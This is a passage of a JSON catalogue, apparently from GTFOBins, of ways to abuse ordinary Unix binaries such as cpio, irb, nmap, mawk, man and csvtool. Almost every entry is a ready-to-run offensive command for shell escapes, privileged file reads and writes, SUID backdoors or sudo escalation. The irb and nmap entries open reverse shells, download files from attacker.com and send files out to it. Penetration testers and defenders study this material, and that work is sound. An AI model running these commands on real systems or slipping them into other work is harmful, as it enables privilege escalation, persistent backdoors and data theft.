          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xpad": {
    "description": "This is a GUI application. The file content is displayed in a sticky note.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxpad -f \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nl": {
    "description": "The read file content is corrupted by a leading space added to each line.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dig": {
    "description": "Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndig -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo dig -f $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./dig -f $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "atobm": {
    "description": "Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "redis": {
    "description": "This works with versions lower than 7.",
    "functions": {
      "file-write": [
        {
          "code": "IP=127.0.0.1\nredis-cli -h $IP\nconfig set dir dir_to_write_to\nconfig set dbfilename file_to_write\nset x \"DATA\"\nsave\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "fping": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nfping -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo fping -f $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xmore": {
    "description": "The file is displayed in a Xorg window, so it needs a working graphical environment.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxmore $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./xmore $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo xmore $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dotnet": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cpio": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\necho \"$LFILE\" | cpio -o\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "readelf": {
    "description": "Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nreadelf -a @$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./readelf -a @$LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "irb": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "irb\nexec '/bin/bash'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "irb\nputs File.read(\"file_to_read\")\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "sudo": [
        {
          "code": "sudo irb\nexec '/bin/bash'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "unsquashfs": {
    "description": "`unsquashfs` preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nmksquashfs sh shell\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n",
    "functions": {
      "sudo": [
        {
          "code": "sudo unsquashfs shell\n./squashfs-root/sh -p\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./unsquashfs shell\n./squashfs-root/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "mawk": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "mawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmawk '//' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./mawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "nmap": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "nmap --interactive\nnmap> !sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_write\nnmap -oG=$LFILE DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "nmap -iL file_to_read\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo nmap --interactive\nnmap> !sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "msgcat": {
    "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsgcat -P $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo msgcat -P $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./msgcat -P $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "chown": {
    "description": "This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "eb": {
    "description": "This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.",
    "functions": {
      "shell": [
        {
          "code": "eb logs\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo eb logs\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "man": {
    "description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "man man\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "man '-H/bin/sh #' man\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "man file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo man man\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "script": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "script -q /dev/null",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo script -q /dev/null",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "file-write": [
        {
          "code": "script -q -c 'echo DATA' file_to_write",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "agetty": {
    "description": "",
    "functions": {
      "suid": [
        {
          "code": "./agetty -o -p -l /bin/sh -a root tty",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "expect": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nexpect $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "expect -c 'spawn /bin/sh;interact'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./expect -c 'spawn /bin/sh -p;interact'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo expect -c 'spawn /bin/sh;interact'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "setfacl": {
    "description": "This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "csvtool": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncsvtool trim t $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./csvtool trim t $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "shell": [
        {
          "code": "csvtool call '/bin/sh;false' /etc/passwd",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo csvtool call '/bin/sh;false' /etc/passwd",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "shuf": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nshuf -z \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "expand": {
    "description": "The read file content is corrupted by replacing tabs with spaces.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nexpand \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./expand \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n",
